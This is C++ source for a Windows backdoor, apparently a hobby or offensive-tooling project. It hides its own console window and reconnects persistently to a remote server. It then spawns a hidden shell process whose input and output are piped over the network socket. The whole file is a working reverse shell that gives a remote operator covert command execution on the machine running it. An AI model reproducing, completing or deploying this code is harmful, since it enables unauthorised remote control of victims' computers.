/**
 * @file "backdoor.cpp"
 * @version 1.0.0
 * 
 * @copyright (C) 2022 lost-century/~backdoor. all rights reserved
*/

#include "lib/backdoor.h"

using namespace std;

#define PROCESO "cmd.exe"

Backdoor* Backdoor::instance = NULL;

Backdoor::Backdoor() 
{
      ShowWindow(GetConsoleWindow(), SW_HIDE);
}

Backdoor::~Backdoor()
{
      closesocket(OnConnectSocket);
      WSACleanup();
}

void Backdoor::log(std::string line)
{
      cout << line << endl;
}

void Backdoor::OnServerConnection(std::string ip, std::string port)
{
      WSADATA wsadata;

      if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
      {
            exit(1);
      }

      struct addrinfo *info, hints;
      ZeroMemory(&hints, sizeof(hints));

      hints.ai_family = AF_INET;
      hints.ai_socktype = SOCK_STREAM;
      hints.ai_protocol = IPPROTO_TCP;

      if (getaddrinfo(ip.c_str(), port.c_str(), &hints, &info) != 0)
      {
            WSACleanup();
            exit(1);
      }

      OnConnectSocket = INVALID_SOCKET;
      OnConnectSocket = socket(info -> ai_family, info -> ai_socktype, info -> ai_protocol);

      if (OnConnectSocket == INVALID_SOCKET)
      {
            WSACleanup();
            exit(1);
      }

      log("> Connecting to server...");

      while (connect(OnConnectSocket, info -> ai_addr, (int)info -> ai_addrlen) == SOCKET_ERROR) {
            Sleep(10000);
      }

      freeaddrinfo(info);

      if (OnConnectSocket == INVALID_SOCKET)
      {
            WSACleanup();
            exit(1);
      }
}

void Backdoor::OnShellOpen(int argc, TCHAR *argv[])
{
      SECURITY_ATTRIBUTES securityAttributes;
      
      HANDLE readin = NULL;
      HANDLE writein = NULL;
      HANDLE readout = NULL;
      HANDLE writeout = NULL;

      size_t Received;
      char ReceivedBuffer[RECV_BUFFER_LEN];

      securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
      securityAttributes.bInheritHandle = TRUE;
      securityAttributes.lpSecurityDescriptor = NULL;

      CreatePipe(&readout, &writeout, &securityAttributes, 0);
      CreatePipe(&readin, &writein, &securityAttributes, 0);

      PROCESS_INFORMATION processInfo;
      STARTUPINFO startupInfo;

      ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
      ZeroMemory(&startupInfo, sizeof(STARTUPINFO));

      startupInfo.cb = sizeof(STARTUPINFO);
      startupInfo.hStdError = writeout;
      startupInfo.hStdOutput = writeout;
      startupInfo.hStdInput = readin;
      startupInfo.dwFlags |= STARTF_USESTDHANDLES;
      startupInfo.wShowWindow = SW_HIDE;

      CreateProcess(NULL, argv[1], NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

      log("> Started cmd.exe");

      char cmdBuffer[CMD_BUFFER_LEN];
      DWORD read;
      DWORD bufferWritten;

      do 
      { 
            Sleep(1000);

            do
            {
                  ReadFile(readout, cmdBuffer, CMD_BUFFER_LEN, &read, NULL);
                  send(OnConnectSocket, cmdBuffer, read, 0);
                  PeekNamedPipe(readout, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
            } 
            while (read > 0);

            ZeroMemory(ReceivedBuffer, RECV_BUFFER_LEN);
            Received = recv(OnConnectSocket, ReceivedBuffer, RECV_BUFFER_LEN, 0);
            WriteFile(writein, ReceivedBuffer, Received, &bufferWritten, NULL);
      } 
      while (Received > 0);

      if (Received == 0)
      {
            log("> Disconnected");
      }
      else
      {
            log("> Received failed: " + WSAGetLastError());
      }
}

Backdoor* Backdoor::getInstance()
{
      if (!instance) {
            instance = new Backdoor();
      }
      return instance;
}
